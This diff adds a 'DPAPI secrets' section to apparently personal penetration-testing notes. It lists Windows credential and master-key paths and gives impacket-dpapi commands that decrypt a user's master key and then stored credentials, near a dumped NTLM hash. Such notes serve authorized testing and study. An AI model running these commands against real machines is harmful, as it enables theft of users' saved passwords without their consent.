@@ -34,6 +34,7 @@
 - <<ssh, SSH>>
 - <<privesc, Privilage Escalation>>
   * <<backup, SeBackupPrivilege>>
+  * <<dpapi,  DPAPI secrets>>
 
 [[overview]]
 == Overview
@@ -928,11 +929,34 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 [*] Cleaning up... 
 ```
 
+[[dpapi]]
+=== DPAPI secrets 
 
+The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:
 
+```bash
+C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
+```
 
+Below are common paths of hidden files that usually contain DPAPI-protected data.
 
+```bash
+C:\Users\$USER\AppData\Local\Microsoft\Credentials\
+C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
+```
 
+1.Dump Decrypted key starts with `0x` 
+
+```bash
+impacket-dpapi masterkey -file "/path/to/file/locally/master" -sid S-1-<SNIP>-1107 -password 'password'
+```
+Returns a long `MD4` key
+
+2.Dump target user password where master2 is a file from `Credentials\` directory
+
+```bash
+impacket-dpapi credential -file "/path/to/file/locally/master2" -key '0xd9a570722fbaf7149f9f<SNIP>9e9c84'
+```
 
 
 
